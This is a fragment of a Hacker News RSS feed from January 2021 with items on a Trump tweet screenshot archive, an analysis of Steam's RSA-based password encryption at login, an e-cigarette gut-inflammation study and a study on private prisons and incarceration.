            <guid isPermaLink="false">hacker-news-small-sites-25695482</guid>
            <pubDate>Sat, 09 Jan 2021 02:19:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Archive of 43k+ Donald Trump Twitter Screenshots]]>
            </title>
            <description>
<![CDATA[
Score 92 | Comments 30 (<a href="https://news.ycombinator.com/item?id=25693054">thread link</a>) | @soheilpro
<br/>
January 8, 2021 | https://pikaso.me/blog/donald-trump-twitter-archive | <a href="https://web.archive.org/web/*/https://pikaso.me/blog/donald-trump-twitter-archive">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <div>


    <section>
      <p>
        <h2>Donald Trump Twitter Screenshot Archive</h2>
      </p>
      
        
      

      <div><p>Donald Trump loves to tweet and everyone knows that.
Twitter is his favorite medium to express his ideas and to communicate with the world.
He has been an active Twitter user since 2009. Much longer than many other world leaders.</p>
<p>Last month (May 2020) he tweeted 845 times â€” that's 28 tweets per day on average!</p>
<center>
  <a href="https://twitter.com/realDonaldTrump/status/491324429184823296"><img src="https://pikaso.me/blog/files/pikaso.me-realDonaldTrump-20140721_205046-491324429184823296.png" alt="Trump Tweet" width="500" height="244"></a>
</center>
<p>A while ago we received a request from one of our users who was looking for a way to screenshot all Donald Trump tweets.
We realized that's a good opportunity to put <a href="https://pikaso.me/">Pikaso</a> into test and see if it can perform such a task without any problems.
It went smoothly and there was only an issue with one of his tweets which included a deleted image.</p>
<p>Today, we are releasing the resulting files to the public.
This archive contains screenshots of 43,475 Donald Trump tweets from May 2009 to May 2020.
Whether you are pro- or anti- Trump, this is an important part of Internet history that we believe should be preserved.</p>
<h3 id="download">Download</h3>
<p>The Donald Trump Twitter Screenshot Archive can be downloaded through the following links:</p>
<ul>
<li><a href="https://pikaso.me/go/trump-twitter-archive-v1.zip">trump_twitter_archive_v1.zip</a> (Direct download, 2.6 GB)</li>
<li><a href="https://pikaso.me/go/trump-twitter-archive-v1.torrent">trump_twitter_archive_v1.torrent</a> (Torrent download, 28.2 KB)</li>
</ul>
<h3 id="howthiswasmade">How This Was Made?</h3>
<p>To create this archive, we first extracted all tweet ids from the realDonaldTrump.csv file that was provided to us.
That file only contained Donald Trump tweets up to March 29, 2020. To get the later tweets, we used <a href="http://trumptwitterarchive.com/">trumptwitterarchive.com</a>.</p>
<p>We then used the <a href="https://pikaso.me/api">Pikaso API</a> to screenshot each individual tweet.</p>
<h3 id="updates">Updates</h3>
<p>We have no plans to keep this archive up to date after the initial release.
However, if you are interested in doing so, you can use <a href="https://pikaso.me/">Pikaso</a>.
You can even <a href="https://pikaso.me/automate">automate</a> it so that each time he tweets, an automatic screenshot is taken.</p>
<h3 id="credit">Credit</h3>
<p>All the tweets are copyright https://twitter.com/realdonaldtrump.<br>
All the media embedded in tweets are copyright their respective owners.<br>
Original tweets data provided by <a href="https://twitter.com/twentysox">@twentysox</a>.</p>
<h3 id="copyrightlicense">Copyright &amp; License</h3>
<p>Copyright © 2020 https://pikaso.me.<br>
This work by https://pikaso.me is licensed under <a href="https://creativecommons.org/licenses/by/4.0">CC BY 4.0</a>.</p>
<h3 id="contact">Contact</h3>
<p>If you have any feedback or questions regarding this work, please <a href="https://pikaso.me/contact">contact us</a>.</p></div>
    </section>

    

    
      <section>
        <h2>More from the Blog</h2>

        
      </section>
    

      </div>
  
</div></div>]]>
            </description>
            <link>https://pikaso.me/blog/donald-trump-twitter-archive</link>
            <guid isPermaLink="false">hacker-news-small-sites-25693054</guid>
            <pubDate>Sat, 09 Jan 2021 00:14:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Athens Joins Y Combinator]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25691977">thread link</a>) | @grzm
<br/>
January 8, 2021 | https://www.notion.so/Athens-Joins-Y-Combinator-86b9dfa30f4141e5bf072fad8f95a6c7 | <a href="https://web.archive.org/web/*/https://www.notion.so/Athens-Joins-Y-Combinator-86b9dfa30f4141e5bf072fad8f95a6c7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Athens-Joins-Y-Combinator-86b9dfa30f4141e5bf072fad8f95a6c7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25691977</guid>
            <pubDate>Fri, 08 Jan 2021 23:25:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Semantic Web, Syllogism, and Worldview (2003)]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25691623">thread link</a>) | @cratermoon
<br/>
January 8, 2021 | https://www.karmak.org/archive/2004/06/semantic_syllogism.html | <a href="https://web.archive.org/web/*/https://www.karmak.org/archive/2004/06/semantic_syllogism.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.karmak.org/archive/2004/06/semantic_syllogism.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25691623</guid>
            <pubDate>Fri, 08 Jan 2021 22:58:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Steams login method is kinda interesting]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690995">thread link</a>) | @sroussey
<br/>
January 8, 2021 | https://owlspace.xyz/cybersec/steam-login/ | <a href="https://web.archive.org/web/*/https://owlspace.xyz/cybersec/steam-login/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><header></header><p>How do you send a password over the internet? You acquire a SSL certificate and let TLS do the job of securely transporting the password from client to server. Of course it’s not as cut-and-dry as I’m making it out to be, but the gist of it holds true and stood the test of time. This hasn’t always been this way though, and one incredibly popular storefront on the world wide web prefers to add a little extra to this day. I’ll be discussing Steam’s unique method of logging in their users, and go down a deep rabbit hole of fascinating implementation details.</p><h3 id="pointing-out-the-obvious">Pointing out the obvious</h3><p>I found a StackOverflow question from 2013 <a href="https://stackoverflow.com/questions/1582894/how-to-send-password-securely-over-http">asking how to securely send a password over HTTP</a>. The answers are pretty unanimous: get a SSL certificate. Here’s an experiment: set up your favorite traffic-capturing proxy, browse to a service you frequently use, log in with your account (or preferably a throwaway), and inspect the requests. You will most certainly find that your username and password are sent as-is in a HTTP request body. The only reason this works is because your connection to the server is encrypted using TLS.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/so-real-host.png" alt="StackOverflow user asking what to do if a webhost doesn't support SSL certificates, told to move to a real webhost"><figcaption><p>Weird to think that this used to be an issue</p></figcaption></figure><p>The internet was a different place though in the early 2010s, let alone the many years prior. We now have services like <a href="https://letsencrypt.org/">Let’s Encrypt</a> which issue SSL certificates free of charge for a period of three months, with automatic renewals if desired. There really wasn’t much of a way around acquiring a SSL certificate for money, but usually with extended validity and support. You could certainly argue that there is a price to be paid for the security and privacy of your users, but that didn’t stop questions like the one I linked from appearing.</p><p>Now that we all agree that TLS is important, let’s switch it up. Let’s pretend we cannot send a password over HTTPS and have to somehow make it work with plain HTTP, while also providing users with some level of security. There’s the <code>Authorization</code> header which is standardized and widely accepted. However, in conjunction with the “Basic” HTTP Authentication scheme, it provides no security if used in plain HTTP.</p><p>There are tried and tested challenge-response algorithms, most notably <a href="https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol">SRP</a> which is designed to do password-based authentication without ever actually sending the password, but you probably have to implement them yourself and a slight oversight could cause serious harm. You could also defer authentication to an external service. “Sign in with service XYZ” is commonly used, but comes with its own ramifications. All things considered, it’s not trivial to send secrets over an inheretly insecure connection.</p><p>So when me and a friend took Steam apart in search for traces of personally identifiable information, I was surprised to see that Steam’s login page doesn’t only rely on TLS to ensure that your password stays protected.</p><h3 id="crypto-cherry-on-top">Crypto cherry on top</h3><p>Again, grab your favorite traffic-capturing proxy and navigate to <a href="https://store.steampowered.com/login">Steam’s login page</a>. Enter your username and password and you will (hopefully) be asked to enter a one-time token generated by your preferred two-factor authentication method. You can stop right there, because the magic I want to point out has already happened. You’ll find that pressing the login button launches a request against an odd endpoint: <code>/login/getrsakey</code>, followed by <code>/login/dologin</code>.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/getrsa-call.png" alt="Requests to fetch script assets, acquire RSA key and perform login"><figcaption><p>All relevant assets and requests in succession</p></figcaption></figure><p>Inspect the request for <code>/login/getrsakey</code> and you’ll find a JSON-formatted response, containing fields with names that should look very familiar to anyone who’s briefly dealt with public key cryptography. You’re given a RSA public key, though the exact values might look a bit odd. It’s clear that <code>publickey_mod</code> and <code>publickey_exp</code> define the modulus and the exponent used in encryption, but the former is given in hexadecimal while the latter appears to be given in binary (I’ll get back on that later). There’s also a timestamp which has no immediately recognizable starting point. As to what the purpose of <code>token_gid</code> is, I have no clue yet.</p><div><pre><code data-lang="json"><span>{</span>
    <span>"success"</span><span>:</span><span>true</span><span>,</span>
    <span>"publickey_mod"</span><span>:</span><span>"c85ba44d5a3608561cb289795ac93b34d4b9b4326f9c09d1d19a9923e2d136b8..."</span><span>,</span>
    <span>"publickey_exp"</span><span>:</span><span>"010001"</span><span>,</span>
    <span>"timestamp"</span><span>:</span><span>"1260462250000"</span><span>,</span>
    <span>"token_gid"</span><span>:</span><span>"2701e0b0a4be3635"</span>
<span>}</span>
</code></pre></div><p>The login page pulls some scripts on load. There is the main login handler contained in <code>login.js</code> which is completely unobfuscated, so anyone can just analyze it and find out what it does. The site also loads some additional dependencies, namely <code>jsbn.js</code> and <code>rsa.js</code>.</p><p>A quick search for the name mentioned in the first line of <code>jsbn.js</code> reveals that these two scripts are the work of <a href="http://www-cs-students.stanford.edu/~tjw/">Tom Wu</a> — a MIT and Stanford graduate who likes software engineering and computer cryptography. They released <code>jsbn.js</code> and <code>rsa.js</code> as pure JavaScript implementations of arbitrary precision integers and RSA encryption/decryption respectively. You’ll also find that these libraries have had their most recent updates in 2005 and 2013 which is a bit of information I’ll come back to later. For now, just keep it in mind.</p><h3 id="going-down-the-rsabbit-hole">Going down the r(s)abbit hole</h3><p>So now that we have all relevant assets, let’s dig around in <code>login.js</code>. The code is a bit of a mess with lots of callbacks and proxied function calls, but it turns out the parts of interest can be easily condensed. In essence, the script can be boiled down to a couple of steps, each step assuming that everything went fine in the previous step.</p><ol><li>The user enters their username and password and presses the login button.</li><li><code>DoLogin</code> is called, which checks if the login mask was filled out correctly and launches a request against <code>/login/getrsakey</code>.</li><li><code>OnRSAKeyResponse</code> is called. This checks if the response is well-formed.</li><li><code>GetAuthCode</code> is called. It runs some platform-specific code in case there are any 2FA measures active on the user’s account.</li><li><code>OnAuthCodeResponse</code> is called. This is where the password is encrypted using RSA and the request against <code>/login/dologin</code> is prepared and executed.</li><li><code>OnLoginResponse</code> is called. The user is logged in and redirected to the Steam storefront.</li></ol><p>The code in <code>OnAuthCodeResponse</code> shows why the requested public key is formatted the way that it is. Starting at line 387 in the source file, the modulus and exponent of the <code>/login/getrsakey</code> response are passed as-is to the RSA library. The user’s password is then encrypted with the given public key and added to the request against <code>/login/dologin</code> in the subsequent login step.</p><div><pre><code data-lang="js"><span>var</span> <span>pubKey</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>results</span><span>.</span><span>publickey_mod</span><span>,</span> <span>results</span><span>.</span><span>publickey_exp</span><span>);</span>
<span>var</span> <span>username</span> <span>=</span> <span>this</span><span>.</span><span>m_strUsernameCanonical</span><span>;</span>
<span>var</span> <span>password</span> <span>=</span> <span>form</span><span>.</span><span>elements</span><span>[</span><span>'password'</span><span>].</span><span>value</span><span>;</span>
<span>password</span> <span>=</span> <span>password</span><span>.</span><span>replace</span><span>(</span><span>/[^\x00-\x7F]/g</span><span>,</span> <span>''</span><span>);</span> <span>// remove non-standard-ASCII characters
</span><span></span><span>var</span> <span>encryptedPassword</span> <span>=</span> <span>RSA</span><span>.</span><span>encrypt</span><span>(</span><span>password</span><span>,</span> <span>pubKey</span><span>);</span>
</code></pre></div><p>I copied the source files onto my local machine to explore the RSA library a little bit. Both the modulus and the exponent are passed to the function <code>RSAPublicKey</code> which behaves like a constructor in the “pre-class” JavaScript era. <code>RSAPublicKey</code> simply wraps both values into instances of <code>BigInteger</code> provided by the <code>jsbn.js</code> script. It was to my surprise that the exponent is actually not represented in binary but, just like the modulus, in hexadecimal. (Also, turns out <code>0x010001</code> is a <a href="https://stackoverflow.com/questions/6098381/what-are-common-rsa-sign-exponent">very common encryption exponent</a> in RSA implementations.) So now it’s clear that the password encryption is based on 2048-bit RSA with an encryption exponent of 65537.</p><div><pre><code data-lang="js"><span>let</span> <span>r</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>"c85ba44d5a360856..."</span> <span>/* insert your own long modulus here */</span><span>,</span> <span>"010001"</span><span>);</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>encryptionExponent</span><span>.</span><span>toString</span><span>());</span> <span>// =&gt; "65537"
</span><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>modulus</span><span>.</span><span>bitLength</span><span>());</span> <span>// =&gt; 2048
</span></code></pre></div><p>Moving on to the <code>timestamp</code> field. The <code>/login/getrsakey</code> response contains an <code>Expires</code> header. It references a date in the past, meaning that the response is absolutely not meant to be cached or persisted in any way. If you check back on <code>/login/getrsakey</code> over a longer period of time, you’ll notice that the public key changes ever so often and, as such, its timestamp value too. This means there’s only a limited time frame in which a certain Steam-issued RSA public key can be used to authenticate.</p><p>This becomes even more evident when examining the subsequent request against <code>/login/dologin</code>. Among many other things, it contains the username, encrypted password as well as the timestamp of the issued RSA public key. Trying to perform a login attempt while altering the timestamp fails as expected. But more importantly, it’s also not possible to reuse an older public key, even if the password is correctly encrypted.</p><p>I went one step further and <a href="https://gist.github.com/JoogsWasTaken/8a8e60859e1721255c57e9185eb6cb10">wrote a simple Python script to collect public keys</a> over the span of three days using a throwaway account. I let it run every five minutes using a cronjob. The goal was to check just how often Steam’s public keys change and to hopefully find out how the <code>timestamp</code> field behaves.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-pubkeys.png" alt="SQLite database containing public keys sourced from Steam"><figcaption><p>Lots and lots and lots of public keys</p></figcaption></figure><p>I found that the public key changes every 12 entries, meaning that it’s safe to assume that they rotate every hour. The encryption exponent stays the same — no surprises here. More intriguing however is the aforementioned <code>timestamp</code> field. For every 12 public keys, the value of the <code>timestamp</code> increases by a certain amount, namely 3600000000 and then some. And what’s more is that this number wraps around after some period of time as can be seen in the following image. Be warned, because all of what I’m about to say is highly speculative.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-wraparound.png" alt="Public key entries where the timestamp value wraps around in-between"><figcaption><p>Timestamp field wrapping around</p></figcaption></figure><p>I found that 3600000000 microseconds is equal to one hour, making me assume that the value of the <code>timestamp</code> field is, in fact, given in microseconds. However, I already hinted at the fact that the timestamp value doesn’t increase by one hour exactly with every new public key. In my own data, I observed that the difference between two successive timestamps is one hour plus 1 to 2.6 seconds, with most being in the order of about 1.05 to 1.25 seconds. But this raises another interesting possibility.</p><p>Let’s assume that a new public key is generated every hour plus one second. If I query the public key …</p></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://owlspace.xyz/cybersec/steam-login/">https://owlspace.xyz/cybersec/steam-login/</a></em></p>]]>
            </description>
            <link>https://owlspace.xyz/cybersec/steam-login/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690995</guid>
            <pubDate>Fri, 08 Jan 2021 21:51:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study: E-cigarettes trigger inflammation in the gut]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690888">thread link</a>) | @finphil
<br/>
January 8, 2021 | https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation | <a href="https://web.archive.org/web/*/https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="639780077299695616">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation"><h2>Study: E-cigarettes trigger inflammation in the gut</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1280"><img src="https://64.media.tumblr.com/719adc344f9d012b68317d81612ff379/1c0ff7a9c3fdd454-cc/s1280x1920/e5552cbe243605bda059375f95029aa3b5896fe1.jpg" alt="image" data-orig-width="1920" data-orig-height="1280" width="1280" height="853"></figure><p><b>- By&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fhealth.ucsd.edu%2Fnews%2Fpages%2Fcontacts.aspx&amp;t=N2UwYzVjZjg2MjkyZWVhOWMyYTc3NzMwM2ZiNTU3NWE1MGQ3MzFmOCwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610397964">Jeanna Vazquez</a> , <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fucsd.edu%2F&amp;t=MjM4NGIwMzA0ZGI1ZGI1MGMzNjY5ZjFhZjUzMzY0NjQ5ZmUyMTFlNCwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610397964">UC San Diego</a> -</b></p><p>Touted by makers as a “healthy” alternative to traditional nicotine cigarettes, new research indicates the chemicals found in e-cigarettes disrupt the gut barrier and trigger inflammation in the body, potentially leading to a variety of health concerns. </p><p>In the study, published Jan. 5, 2021 in the journal <i><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.cell.com%2Fiscience%2Ffulltext%2FS2589-0042%2821%2900003-1&amp;t=Nzk2MzdiM2EzM2RkYmUzYmQ1NzBlMmU3MjJiYTQ0MjA5ZWE1ZTk4ZCwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610397964">iScience</a></i>, Soumita Das, PhD, associate professor of pathology, and Pradipta Ghosh, MD, professor of cellular and molecular medicine at UC San Diego School of Medicine and Moores Cancer Center at UC San Diego School of Medicine, with colleagues, found that chronic use of nicotine-free e-cigarettes led to a “leaky gut,” in which microbes and other molecules seep out of the intestines, resulting in chronic inflammation. Such inflammation can contribute to a variety of diseases and conditions, including inflammatory bowel disease, dementia, certain cancers, atherosclerosis, liver fibrosis, diabetes and arthritis. </p><p>“The gut lining is an amazing entity. It is comprised of a single layer of cells that are meant to seal the body from the trillions of microbes, defend our immune system, and at the same time allow absorption of essential nutrients,” said Ghosh. “Anything we eat or drink, our lifestyle choices in other words, has the ability to impact our gut microbes, the gut barrier and overall health. Now we know that what we smoke, such as e-cigarettes, negatively impacts it as well.”</p><p>The researchers found that two chemicals used as a base for all e-cigarette liquid vapor — propylene glycol and vegetable glycerol — were the cause of inflammation.</p><p>“Numerous chemicals are created when these two are heated to generate the fumes in vaping that cause the most damage, for which there are no current regulations,” said Ghosh. “The safety of e-cigarettes have been debated fiercely on both sides. Nicotine content, and its addictive nature, has always been the major focus of those who argue against its safety, whereas lack of chemicals in the carcinogens that are present in the cigarette smoke has been touted by the makers of e-cigarettes when marketing these products as a ‘healthy alternative.’ In reality, it’s the chemicals making up the vapor liquid that we should be more concerned about as they are the cause of gut inflammation.” &nbsp;</p><p>For the study, the team used 3D models of human intestinal tracts generated from patient cells and simulated what happens when e-cigarette vapors enter the gut lining. Researchers validated the findings using mice models of vaping in collaboration with Laura Crotty-Alexander, MD, associate professor of medicine in the Division of Pulmonary, Critical Care and Sleep Medicine at UC San Diego School of Medicine and section chief of Pulmonary Critical Care at Veterans Affairs San Diego Healthcare System.</p><p>To produce the 3D gut organoids, the researchers collected stem cells from patients’ biopsies during colonoscopies and grew them in vitro. The stem cells differentiated into the four different cell types that make up the gut lining. The team then exposed the organoids to e-cigarette liquid vapor, mimicking the frequency of a chronic vaper.</p><figure data-orig-width="640" data-orig-height="400"><img src="https://64.media.tumblr.com/4cd0a7df45ff92ad73c77d47869af825/1c0ff7a9c3fdd454-ab/s640x960/5d6405078c464994050bbc8bc369bc2296633165.jpg" alt="image" data-orig-width="640" data-orig-height="400" width="640" height="400"></figure><p><i>Image: In the bottom frames, burst cell junctions in the gut lining can be seen after being exposed to e-cigarette chemicals as compared to healthy cells in the top frames. Credit: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fucsdnews.ucsd.edu%2Fpressrelease%2Fstudy-e-cigarettes-trigger-inflammation-in-the-gut&amp;t=Y2IxYTdhMDNiOTJlM2ZkMDViZDQ0YjI1MjRjMDg4NDc4ODc2YzM4ZSwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610397964">HUMANOID Center of Research Excellence</a>.</i></p><p>They noted that epithelial tight conjunction markers, which are zipper-like proteins that form the gut’s first physical barrier, began to break or loosen, causing pathogens from the vapor to seep into the surrounding immune system, wreaking havoc on protective epithelial cells that lie just beneath. </p><p>Such cells act as a defense against infection by clearing pathogenic microbes and initiating certain immune responses in the body. When exposed to the e-cigarette liquid, the cells were quickly overwhelmed, unable to effectively clear pathogens, resulting in gut inflammation. </p><p>The study is part of the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmedschool.ucsd.edu%2Fresearch%2Finm%2Fhumanoid%2FPages%2Fdefault.aspx&amp;t=MThmMTQ4NjViOTkwOGQwYzNmYTZjMzAyOTRlOTQ0MjA0MmNiYzhjMSwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610397964">HUMANOID Center of Research Excellence</a>, a core facility based at UC San Diego School of Medicine led by Ghosh and Das who was senior author of the study. Scientists at the center use a variety of human organoids and other tools to model diseases and effects.</p><p>“This is the first study that demonstrates how chronic exposure to e-cigarettes increases the gut’s susceptibility to bacterial infections, leading to chronic inflammation and other health concerns,” said Das. “Given the importance of the gut barrier in the maintenance of the body’s immune homeostasis, the findings provide valuable insight into the potential long-term harmful effects chronic use of e-cigarettes on our health.” </p><p>Ghosh said damage to the gut lining may be reversible over time if the inciting factor, in this case e-cigarette use, is eliminated, but the effects of chronic inflammation upon other organs, such as the heart or brain, may be irreversible. In the future, Ghosh said she and colleagues plan to look at different flavorings of e-cigarettes to determine what effects they might have on the gut. </p><p>Additional study co-authors include: Aditi Sharma, Jasper Lee, Ayden G. Fonseca, Alex Moshensky, Taha Kothari, Ibrahim M. Sayed, Stella-Rita Ibeawuchi, Rama F. Pranadinata, Jason Ear, and Debashis Sahoo, all at UC San Diego. </p><p>This research was funded, in part, by the National Institutes of Health (DK107585, AI141630, and HL147326) and the University of California Office of the President — Tobacco-Related Disease Research Program (28IP-0024, 30IP-0965 and 26IP-0040).</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fucsdnews.ucsd.edu%2Fpressrelease%2Fstudy-e-cigarettes-trigger-inflammation-in-the-gut&amp;t=Y2IxYTdhMDNiOTJlM2ZkMDViZDQ0YjI1MjRjMDg4NDc4ODc2YzM4ZSwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610397964">University of California San Diego (UC San Diego)</a></b></p><p><b>Full research:</b>&nbsp;“E-cigarettes compromise the gut barrier and trigger inflammation”, <i>iScience</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1016%2Fj.isci.2021.102035&amp;t=NjMyMTA3MmE0NGExOGMxYjk2Njc3N2JhN2YzNDkzZTI4OTJlMDQ2ZSwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610397964">https://doi.org/10.1016/j.isci.2021.102035</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/635162930879594496/smoking-and-covid19">Study: How smoking worsens COVID-19 infection in the airways</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/smoking">smoking</a>
                                    
                                        <a href="https://nuadox.com/tagged/toxicology">toxicology</a>
                                    
                                        <a href="https://nuadox.com/tagged/ecigarettes">ecigarettes</a>
                                    
                                        <a href="https://nuadox.com/tagged/vaping">vaping</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/gut">gut</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690888</guid>
            <pubDate>Fri, 08 Jan 2021 21:42:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[States with private prisons put more people in prison for longer]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690796">thread link</a>) | @mike_h
<br/>
January 8, 2021 | https://academictimes.com/states-with-private-prisons-put-more-people-in-prison-for-longer/ | <a href="https://web.archive.org/web/*/https://academictimes.com/states-with-private-prisons-put-more-people-in-prison-for-longer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="articleBody"><p dir="ltr">U.S. states that rely on private prisons incarcerate more people for longer periods of time, according to a first-of-its-kind study that establishes a causal connection between private prisons and incarceration.Â&nbsp;</p><p dir="ltr">The <a href="https://www.sciencedirect.com/science/article/abs/pii/S0927537120301123">paper</a>, published in the December issue of <em>Labour Economics</em>, adds to researchersâ€™ understanding of financial incentives in the criminal justice system, according to authors Gregmar Galinato and Ryne Rohla, both economists at Washington State University.</p><p dir="ltr">The researchers found that states that opened private prisons saw a 4% jump in prison population, or an average of between 6 and 37 extra prisoners per million residents, based on a review of data from 1989 to 2008. Incarcerating those extra people cost states an extra $1.9 million to $10.6 million per year if all additional prisoners were housed in private prisons.</p><p dir="ltr">Galinato and Rohla found that the growth in prison population experienced by states with private prisons was caused by an increase in the number of people being sent to prison, as well as judges handing down longer sentences for particular crimes.Â&nbsp;</p><p dir="ltr">Specifically, a 1% increase in private prison beds per capita will increase sentencing lengths for regulatory offenses by 29 days, weapons offenses by 13 days, drug offenses by 7 days and fraud offenses by 2 days, the researchers found.Â&nbsp;</p><p dir="ltr">However, those figures might underestimate the actual amount of time incarcerated people spend in private prisons, the researchers added, pointing to a 2019 <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=2523238">paper</a> by Wisconsin School of Business professor Anita Mukherjee that found that private prison inmates in Mississippi served a full three months longer than people convicted of the same crimes who were sent to public prisons. Mukherjee attributed the lengthier time served to the fact that conduct violations, which can tack extra time onto prisonersâ€™ sentences, are more common in private prisons than in public ones.Â&nbsp;</p><p dir="ltr">While Galinato and Rohla found that people convicted of weapons and drug offenses saw harsher sentences in states with more private prison beds, sentencing for other crimes such as murder did not change.Â&nbsp;</p><p dir="ltr">â€œThat was a good marker for us, because that showed that this wasnâ€™t random noise going on or some correlation,â€� said Galinato of the fact that only some crimes saw a sentencing difference.Â&nbsp;</p><p dir="ltr">In order to establish a causal relationship, the researchers created an instrument called â€œprivatization knowledgeâ€� that indicated academic support for privatization by state from 1989 to 2008. That instrument, which was partially based on the use of words like â€œneoliberalismâ€� in academic journals, corresponded only to the proliferation of private prisons -- not the incarceration rate, the researchers said. Â&nbsp;</p><p dir="ltr">Galinato said that finding an instrument to establish causality was one of the most difficult parts of the project, as the connection between private prisons and incarceration can be self-perpetuating. Developing and using the â€œprivatization knowledgeâ€� instrument took years.Â&nbsp;</p><p dir="ltr">Galinato came up with the idea in 2015, and Rohla began compiling data shortly thereafter. It took about one year to get permission to use Department of Justice data, he said.Â&nbsp;</p><p dir="ltr">In addition to establishing a causal relationship between private prisons and incarceration, Galinato and Rohla also examined two factors that could lead authorities to hand down more and harsher sentences in the first place.Â&nbsp;</p><p dir="ltr">Political corruption could lead politicians to enact stricter laws and cause judges to hand down harsher sentences, the researchers said, pointing to the 2008 â€œkids for cashâ€� <a href="https://nypost.com/2014/02/23/film-details-teens-struggles-in-state-detention-in-payoff-scandal/">scandal</a> in which Pennsylvania judges received kickbacks in exchange for giving juvenile offenders harsher prison sentences.Â&nbsp;</p><p dir="ltr">Judges may also consider prison capacity when sentencing people, Galinato added. â€œIf you have a crowded public system, the judge will say, â€˜OK, this is a marginal person, weâ€™ll probably put them on probation because we donâ€™t want to overcrowd the prison.â€™â€�Â&nbsp;</p><p dir="ltr">However, the researchers did not find a strong enough link to claim that either factor has definitively led to higher incarceration rates at private prisons.Â&nbsp;</p><p 